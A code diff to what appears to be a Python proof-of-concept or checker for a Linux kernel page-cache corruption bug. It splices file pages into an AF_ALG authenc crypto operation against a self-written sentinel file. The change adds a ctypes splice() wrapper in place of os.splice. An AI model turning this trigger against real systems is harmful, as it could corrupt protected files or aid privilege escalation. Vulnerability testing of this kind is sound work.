@@ -37,6 +37,39 @@ CRYPTLEN = 16    # one AES block
 TAGLEN   = 16    # truncated HMAC-SHA256
 MARKER   = b"PWND"
 
+import ctypes
+import os
+
+# Load the C library
+libc = ctypes.CDLL("libc.so.6", use_errno=True)
+
+# Define the splice function signature
+# ssize_t splice(int fd_in, loff_t *off_in, int fd_out, loff_t *off_out, size_t len, unsigned int flags);
+libc.splice.argtypes = [
+    ##ctypes.c_int, ctypes.POINTER(ctypes.c_longlong),
+    ctypes.c_int, ctypes.POINTER(ctypes.c_longlong),
+    ctypes.c_int, ctypes.POINTER(ctypes.c_longlong),
+    ctypes.c_size_t, ctypes.c_uint
+]
+libc.splice.restype = ctypes.c_ssize_t
+
+
+def python_splice(fd_in, fd_out, length, offset_src=None, offset_dst=None, flags=0):
+    # print(f"splice_p arg {fd_in}, {offset_src}, {fd_out}, {offset_dst}, {length}, {flags}")
+    offset_src_arg = None
+    offset_dst_arg = None
+
+    if (offset_src != None):
+    	offset_src_arg = ctypes.c_long(offset_src)
+    if (offset_dst != None):
+    	offset_dst_arg = ctypes.c_long(offset_dst)
+    # print(f"splice_s arg {fd_in}, {offset_src_arg}, {fd_out}, {offset_dst_arg}, {length}, {flags}")
+    res = libc.splice(fd_in, offset_src_arg, fd_out, offset_dst_arg, length, flags)
+    if res == -1:
+        errno = ctypes.get_errno()
+        raise OSError(errno, os.strerror(errno))
+    return res
+
 
 def build_authenc_keyblob(authkey: bytes, enckey: bytes) -> bytes:
     # struct rtattr { u16 rta_len; u16 rta_type } || __be32 enckeylen || keys
@@ -45,7 +78,7 @@ def build_authenc_keyblob(authkey: bytes, enckey: bytes) -> bytes:
     return rtattr + keyparam + authkey + enckey
 
 
-def precheck() -> str | None:
+def precheck() -> str:
     if not os.path.exists("/proc/crypto"):
         return "/proc/crypto missing"
     try:
@@ -61,7 +94,7 @@ def precheck() -> str | None:
     return None
 
 
-def attempt_trigger(target_path: str) -> tuple[bool, bytes]:
+def attempt_trigger(target_path): # -> tuple[bool, bytes]:
     sentinel = (b"COPYFAIL-SENTINEL-UNCORRUPTED!!\n" * (PAGE // 32))[:PAGE]
     with open(target_path, "wb") as f:
         f.write(sentinel)
@@ -96,10 +129,10 @@ def attempt_trigger(target_path: str) -> tuple[bool, bytes]:
     # page-cache pages now sit in the destination scatterlist.
     pr, pw = os.pipe()
     try:
-        n = os.splice(fd_target, pw, CRYPTLEN + TAGLEN, offset_src=0)
+        n = python_splice(fd_target, pw, CRYPTLEN + TAGLEN, offset_src=0)
         if n != CRYPTLEN + TAGLEN:
             raise RuntimeError(f"splice file->pipe short: {n}")
-        n = os.splice(pr, op.fileno(), n)
+        n = python_splice(pr, op.fileno(), n)
         if n != CRYPTLEN + TAGLEN:
             raise RuntimeError(f"splice pipe->op short: {n}")
     except OSError as e:
